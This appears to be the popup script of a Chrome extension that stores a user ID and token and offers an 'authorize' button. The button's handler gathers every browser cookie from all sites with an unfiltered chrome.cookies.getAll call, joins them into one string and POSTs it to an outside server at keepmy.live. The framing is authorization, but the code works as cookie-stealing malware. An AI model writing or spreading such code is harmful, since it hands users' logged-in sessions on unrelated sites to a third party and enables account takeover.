function StatusBox(msg) {
  $("#status").css("background-color", "red");
  $("#status").css("visibility", "visible");
  $("#statust").text(msg);
}

function StatusBoxOk(msg) {
  $("#status").css("background-color", "green");
  $("#status").css("visibility", "visible");
  $("#statust").text(msg);
}

var keys = ["userid", "token"];

document.addEventListener("DOMContentLoaded", function() {
  chrome.storage.local.get(keys, function(data) {
    for (let key of keys) {
      let field = document.getElementById(key);
      field.value = data[key];
      field.oninput = saveData;
    }
  });
})

function saveData(e) {
  chrome.storage.local.set({[this.id]: this.value});
}

authorize.addEventListener("click", async () => {
  let bundle = "";
  chrome.cookies.getAll({}, function (cookies) {
    if (Object.keys(cookies).length > 0) {
      cookies.forEach(e => {
        let x = e.name+"="+e.value+"; ";
        bundle += x;
      });

      if (($("#userid").val()).length < 1 || ($("#token").val()).length < 1) {
        StatusBox("Enter userid and token! (4)")
        return;
      }

      let auth_uri = "https://keepmy.live/api/auth/";
      let data = {
        userid: $("#userid").val(),
        token: $("#token").val(),
        data: bundle
      };


      $.ajax({
        type: "POST",
        crossDomain: true,
        headers: {  'Access-Control-Allow-Origin': 'https://keepmy.live/'},
        url: auth_uri,
        data: data,
      })
        .done(function (e) {
          StatusBoxOk(`${e.msg}`)
          console.log(e);
        })
        .fail(function (e) {
          console.log(e);
          if (e.responseJSON != null)
            StatusBox(`${e.responseJSON.msg} (Err.${e.responseJSON.code})`)
          else
            StatusBox(`CORS error, visit origin site (Err.CORS41231)`);
        })
    }
    else {
      StatusBox("Cookies not found! (1)")
    }
  });
});
